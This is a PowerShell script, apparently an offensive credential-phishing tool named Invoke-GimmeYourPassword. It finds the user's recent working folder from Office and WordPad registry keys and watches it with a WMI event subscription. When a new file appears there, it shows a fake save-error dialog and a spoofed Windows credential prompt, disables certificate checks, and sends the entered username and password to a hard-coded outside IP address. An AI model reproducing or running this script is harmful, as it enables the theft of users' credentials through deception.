function obtain-path() {
    param (
    [string]$Path,
    [int]$Source
    )
    
        $pathSplit=$path.split("\")
        $pathOnly= $pathSplit[0 .. $($pathSplit.length -2) ]
        $pathOnly = $pathOnly -join "\"
        if ($source -eq 1) {
            #Non invoke chain
           #write-output "Source is equal to 1"
            return $pathOnly
        }         
        elseif ($source -eq 2) {
            #Invoke chain 
            $pathToMonitor = $pathOnly
            $pathToMonitor = $pathToMonitor.split("\")
            $pathToMonitorDriverLetter=$pathToMonitor[0]
            $pathToMonitorPathRemainder=$pathToMonitor[1..$pathToMonitor.Length] -join "\\"
            $pathToMonitorPathRemainder = "\\" + $pathToMonitorPathRemainder + "\\"
            $myarray=@()
            $myarray+=$pathToMonitorDriverLetter
            $myarray+=$pathToMonitorPathRemainder
            return $myarray
        }
        
} 


function search-keys { 
    #Include an optional parameter. This will determine how the function obtain path works. 
    #If the INVOKE flag is present we will set the source to two, as we need to return additional parameters for the temporary WMI portion. 
	param (
	[switch]$Invoke
	)
    if (test-path "HKLM:\software\gimme")
	{
		$pathToMonitor="Z:/demo"
	}
	elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
    {
        write-output "hit 2 MRU path exists"
        $pathToMonitor="Z:/demo"
    }
    #elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User #MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
	#{
    #   	write-output "hit 1 MRU path exists"
	#}
	#elseif (test-path "HKCU:\Software\Microsoft\Office\14.0\Word\File MRU" ) 
    #{
    #    write-output "hit 2 MRU path exists"
    #}
	#elseif (test-path "HKCU:\Software\Microsoft\Office\12.0\Word\File MRU")				
	#{
	#   write-output "hit 3 MRU path exists"
	#   $pathToMonitor="C:\Users\octavio\Documents"
	#}
	elseif (test-path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List") 
    {
        $pathToMonitor=(get-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List").file1
        #write-output $pathToMonitor
    }
    if ($Invoke)
	{
	#If Invoke present
    $returnValues=obtain-path -source 2 -path $pathToMonitor    
    $returnValues
    return $returnValues
    }
	else 
    {
	#Use this path if $invoke is not present. 
      #write-output "source set to 1"
      obtain-path -source 1 -path $pathToMonitor
    }
	

}

function start-tempsubscription{
    param (
        [string]$pathToMonitorDriverLetter,
        [string]$pathToMonitorPathRemainder
    )
    $localComputerName=$env:COMPUTERNAME
    $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")
    
    register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action { 
    $global:MyEVT=$event
    write-host  "event occurred" 
    $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
    $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
    $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive
    $modfilenameExtension=$modfilename+"."+$modExtension

    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file")
    $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    if ($cred) {
        $wc = new-object net.webclient;
        $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stae (Red Hat modified)");
        $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
        $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
        $result=$wc.downloadstring('https://200.200.32.134:443');
        }
    
  }
    }

function Invoke-GimmeYourPassword {
	param (
        [Parameter(Mandatory=$True)]
		[string]$URL
    )
	$pathToMonitor=search-keys -Invoke
    write-output $pathToMonitor[0]
    write-output $pathToMonitor[1]
    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
    #write-output $pathToMonitor[0]
    #write-output $pathToMonitor
    
}
